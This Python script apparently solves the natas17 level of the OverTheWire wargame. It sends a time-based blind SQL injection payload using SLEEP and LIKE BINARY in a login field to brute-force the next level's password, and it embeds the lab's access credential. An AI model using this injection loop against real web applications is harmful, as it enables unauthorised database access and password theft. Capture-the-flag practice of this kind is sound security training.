import requests
import time

URL = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'
alphabet = 'cdfghijklmopqrsvwxyCDFGHIJKLMOPQRSVWXY047'
passPhrase = ''
s = requests.Session()

for i in range(32):
	for j in alphabet:
		t = time.time()
		data = {'username':'natas18" AND IF(password LIKE BINARY "'+passPhrase+j+'%",SLEEP(8),1) # '}
		r = s.post(URL,data = data)

		if(time.time() - t > 7):
			passPhrase = passPhrase + j
			print(passPhrase)
			break